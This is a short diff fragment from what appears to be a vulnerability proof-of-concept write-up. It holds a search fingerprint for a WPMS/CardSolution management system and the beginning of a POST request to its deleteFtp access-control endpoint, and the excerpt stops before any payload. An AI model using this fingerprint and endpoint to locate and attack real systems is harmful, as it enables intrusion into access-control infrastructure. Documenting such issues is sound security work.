@@ -5,7 +5,7 @@
 body="src=/WPMS/asset/common/js/jsencrypt.min.js"
 ```
 
-## poc
+## POC
 ```
 POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1
 Host: Cache-Control: max-age=0
